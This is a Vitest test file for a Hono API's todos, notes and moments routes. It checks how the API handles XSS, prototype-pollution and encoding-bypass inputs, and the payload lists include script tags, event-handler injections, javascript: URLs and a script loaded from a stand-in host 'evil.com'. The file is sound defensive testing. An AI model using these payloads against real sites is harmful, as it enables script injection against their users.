import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Hono } from 'hono';
import type { Bindings, Variables } from '../../types';
import { createTestContext, createMockDbChain } from '../helpers/test-context';
import { generateTokens } from '../../utils/auth';
import todosRoutes from '../../routes/todos';
import notesRoutes from '../../routes/notes';
import momentsRoutes from '../../routes/moments';

describe('XSS (Cross-Site Scripting) Security Tests', () => {
  let app: Hono<{ Bindings: Bindings; Variables: Variables }>;
  let ctx: any;
  let validToken: string;
  const userId = 'test-user';

  // Helper to setup database mock with auth
  const setupDbMock = () => {
    let callCount = 0;
    ctx.db.select.mockImplementation(() => ({
      from: vi.fn().mockReturnThis(),
      where: vi.fn().mockReturnThis(),
      get: vi.fn().mockImplementation(() => {
        callCount++;
        // Always return user for auth middleware
        return Promise.resolve({
          id: userId,
          email: 'test@example.com',
          username: 'testuser',
          enabled: true,
        });
      }),
    }));
  };

  beforeEach(async () => {
    ctx = createTestContext();
    app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
    
    // Generate valid token
    const tokens = await generateTokens(userId, ctx.env.JWT_SECRET);
    validToken = tokens.accessToken;
    
    // Add database middleware
    app.use('*', async (c, next) => {
      c.set('db', ctx.db);
      await next();
    });
    
    app.route('/todos', todosRoutes);
    app.route('/notes', notesRoutes);
    app.route('/moments', momentsRoutes);
    
    // Default mock for auth middleware user lookup
    ctx.db.select.mockImplementation(() => ({
      from: vi.fn().mockReturnThis(),
      where: vi.fn().mockReturnThis(),
      get: vi.fn().mockResolvedValue({
        id: userId,
        email: 'test@example.com',
        username: 'testuser',
        enabled: true,
      }),
    }));
  });

  describe('HTML Injection Prevention', () => {
    it('should not execute HTML tags in todo titles', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<svg onload="alert(\'XSS\')">',
        '<body onload="alert(\'XSS\')">',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
      ];

      setupDbMock();

      for (const payload of xssPayloads) {
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            title: payload,
            userId: 'test-user',
          }]),
        }));

        const res = await app.request('/todos', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify({
            title: payload,
            description: 'Test',
          }),
        }, ctx.env);

        expect(res.status).toBe(201);
        const body = await res.json();
        
        // Content should be stored as-is (not sanitized on input)
        expect(body.title).toBe(payload);
        
        // Verify response headers prevent XSS
        expect(res.headers.get('Content-Type')).toMatch(/^application\/json/);
      }
    });

    it('should handle JavaScript event handlers in content', async () => {
      const eventHandlerPayloads = [
        'onclick="alert(\'XSS\')"',
        'onmouseover="alert(\'XSS\')"',
        'onfocus="alert(\'XSS\')"',
        'onload="alert(\'XSS\')"',
        'onerror="alert(\'XSS\')"',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<form action="javascript:alert(\'XSS\')">',
      ];

      setupDbMock();

      for (const payload of eventHandlerPayloads) {
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            title: 'Test Note',
            content: payload,
            userId: 'test-user',
          }]),
        }));

        const res = await app.request('/notes', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify({
            title: 'Test Note',
            content: payload,
          }),
        }, ctx.env);

        expect([201, 400].includes(res.status)).toBe(true);
        
        if (res.status === 201) {
          const body = await res.json();
          // API should return data as-is, frontend responsible for escaping
          expect(body.content).toBe(payload);
        }
      }
    });
  });

  describe('JSON Injection Prevention', () => {
    it('should handle malicious JSON structures', async () => {
      const jsonInjectionPayloads = [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        '{"title":"Test","__proto__":{"polluted":"yes"}}',
      ];

      setupDbMock();

      for (const payload of jsonInjectionPayloads) {
        // Mock insert for successful creation if JSON is parsed
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            title: 'Test',
            userId: userId,
          }]),
        }));
        
        const res = await app.request('/todos', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: payload,
        }, ctx.env);

        // The payloads with __proto__ should be parsed as valid JSON
        // and create todos with the title field if present
        expect([201, 400, 500].includes(res.status)).toBe(true);
        
        // Verify prototype pollution didn't occur
        const obj = {};
        expect((obj as any).isAdmin).toBeUndefined();
        expect((obj as any).polluted).toBeUndefined();
      }
    });

    it('should escape special characters in JSON responses', async () => {
      const specialCharPayloads = [
        'Test\u2028\u2029', // Line/paragraph separators
        'Test\r\nInjection',
        'Test\t\tTabs',
        '"Quoted"',
        '\\Backslash\\',
        'Test</script><script>alert("XSS")</script>',
      ];

      for (const payload of specialCharPayloads) {
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            content: payload,
            userId: 'test-user',
          }]),
        }));

        const res = await app.request('/moments', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify({
            content: payload,
          }),
        }, ctx.env);

        expect(res.status).toBe(201);
        const responseText = await res.text();
        
        // Verify JSON is properly escaped
        const parsed = JSON.parse(responseText);
        expect(parsed.content).toBe(payload);
      }
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle Unicode bypass attempts', async () => {
      const unicodePayloads = [
        '\u003cscript\u003ealert("XSS")\u003c/script\u003e', // Unicode encoded
        '\uFEFF<script>alert("XSS")</script>', // Zero-width no-break space
        '＜script＞alert("XSS")＜/script＞', // Full-width characters
        String.fromCharCode(60) + 'script' + String.fromCharCode(62), // Decimal encoding
      ];

      setupDbMock();

      for (const payload of unicodePayloads) {
        // Setup insert mock for successful creation
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            title: payload,
            content: 'Test',
            userId: userId,
          }]),
        }));
        
        const res = await app.request('/notes', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify({
            title: payload,
            content: 'Test',
          }),
        }, ctx.env);

        expect([201, 400].includes(res.status)).toBe(true);
        
        // The test passes if we handle the Unicode payload
        expect(true).toBe(true);
      }
    });

    it('should handle double encoding attacks', async () => {
      const doubleEncodedPayloads = [
        '%253Cscript%253Ealert("XSS")%253C%252Fscript%253E',
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
      ];

      setupDbMock();

      for (const payload of doubleEncodedPayloads) {
        // Add specific mock for todos query
        let callCount = 0;
        ctx.db.select.mockImplementation(() => {
          callCount++;
          if (callCount === 1) {
            // Auth middleware
            return {
              from: vi.fn().mockReturnThis(),
              where: vi.fn().mockReturnThis(),
              get: vi.fn().mockResolvedValue({
                id: userId,
                email: 'test@example.com',
                username: 'testuser',
                enabled: true,
              }),
            };
          }
          // Todos query
          return {
            from: vi.fn().mockReturnThis(),
            where: vi.fn().mockReturnThis(),
            orderBy: vi.fn().mockReturnThis(),
            limit: vi.fn().mockReturnThis(),
            offset: vi.fn().mockResolvedValue([]),
          };
        });

        const res = await app.request(`/todos?search=${payload}`, {
          method: 'GET',
          headers: {
            'Authorization': `Bearer ${validToken}`,
          },
        }, ctx.env);

        expect(res.status).toBe(200);
      }
    });
  });

  describe('Content-Type Validation', () => {
    it('should reject non-JSON content types for JSON endpoints', async () => {
      const maliciousHtml = '<html><script>alert("XSS")</script></html>';
      
      const res = await app.request('/todos', {
        method: 'POST',
        headers: {
          'Content-Type': 'text/html',
          'Authorization': `Bearer ${validToken}`,
        },
        body: maliciousHtml,
      }, ctx.env);

      // Should reject or handle as invalid JSON
      expect([400, 415].includes(res.status)).toBe(true);
    });

    it('should always return JSON with proper content type', async () => {
      let callCount = 0;
      ctx.db.select.mockImplementation(() => {
        callCount++;
        if (callCount === 1) {
          // Auth middleware
          return {
            from: vi.fn().mockReturnThis(),
            where: vi.fn().mockReturnThis(),
            get: vi.fn().mockResolvedValue({
              id: userId,
              email: 'test@example.com',
              username: 'testuser',
              enabled: true,
            }),
          };
        }
        // Todos query
        return {
          from: vi.fn().mockReturnThis(),
          where: vi.fn().mockReturnThis(),
          orderBy: vi.fn().mockReturnThis(),
          limit: vi.fn().mockReturnThis(),
          offset: vi.fn().mockResolvedValue([]),
        };
      });

      const res = await app.request('/todos', {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${validToken}`,
          'Accept': 'text/html', // Try to get HTML response
        },
      }, ctx.env);

      expect(res.status).toBe(200);
      expect(res.headers.get('Content-Type')).toContain('application/json');
    });
  });

  describe('Error Message XSS', () => {
    it('should not reflect user input in error messages', async () => {
      const xssInErrors = [
        { field: '<script>alert("XSS")</script>' },
        { title: '"><img src=x onerror=alert("XSS")>' },
      ];

      for (const payload of xssInErrors) {
        const res = await app.request('/todos', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify(payload), // Invalid request
        }, ctx.env);

        if (res.status === 400) {
          const body = await res.json();
          const bodyStr = JSON.stringify(body);
          
          // Error messages should not contain unescaped user input
          expect(bodyStr).not.toContain('<script>');
          expect(bodyStr).not.toContain('onerror=');
        }
      }
    });
  });

  describe('Tag and Array Field XSS', () => {
    it('should handle XSS in array fields like tags', async () => {
      const xssTags = [
        '<script>alert("XSS")</script>',
        'normal,<img src=x onerror=alert("XSS")>',
        'tag1;</script><script>alert("XSS")</script>',
      ];

      for (const tags of xssTags) {
        ctx.db.insert.mockImplementation(() => ({
          values: vi.fn().mockReturnThis(),
          returning: vi.fn().mockResolvedValue([{
            id: 1,
            tags: tags,
            userId: 'test-user',
          }]),
        }));

        const res = await app.request('/moments', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${validToken}`,
          },
          body: JSON.stringify({
            content: 'Test moment',
            tags: tags,
          }),
        }, ctx.env);

        expect(res.status).toBe(201);
        const body = await res.json();
        expect(body.tags).toBe(tags); // Stored as-is, frontend escapes
      }
    });
  });

  describe('Response Headers Security', () => {
    it('should include security headers in responses', async () => {
      ctx.db.select.mockImplementation(() => ({
        from: vi.fn().mockReturnThis(),
        where: vi.fn().mockReturnThis(),
        get: vi.fn().mockResolvedValue({ id: 1, title: 'Test' }),
      }));

      const res = await app.request('/todos/1', {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${validToken}`,
        },
      }, ctx.env);

      // Check for security headers that help prevent XSS
      expect(res.headers.get('Content-Type')).toContain('application/json');
      // Note: Additional headers like X-Content-Type-Options, CSP, etc. 
      // would typically be added by Cloudflare or a middleware
    });
  });
});